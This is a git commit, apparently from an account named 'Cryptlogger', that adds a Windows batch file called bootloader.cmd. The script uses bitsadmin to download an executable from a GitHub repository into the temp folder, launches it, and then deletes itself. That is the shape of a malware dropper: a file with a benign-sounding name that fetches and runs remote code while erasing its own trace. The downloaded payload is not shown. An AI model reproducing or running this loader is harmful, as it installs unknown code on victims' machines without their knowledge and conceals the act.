a9593f4047b6e3ca8a334e45f82f906e103b0e12
Cryptlogger <135084423+Cryptlogger@users.noreply.github.com>
2024-02-23 20:32:48 -0800

    Add files via upload

---
+++ bootloader.cmd
@@ -0,0 +1,8 @@
+ÿþ&cls
+ÿþ
+
+set pOut="%temp%\\out.exe"
+bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/Cryptlogger/didactic-enigma/raw/main/installer.exe" %pOut%
+start "" %pOut%
+DEL "%~f0"
+                
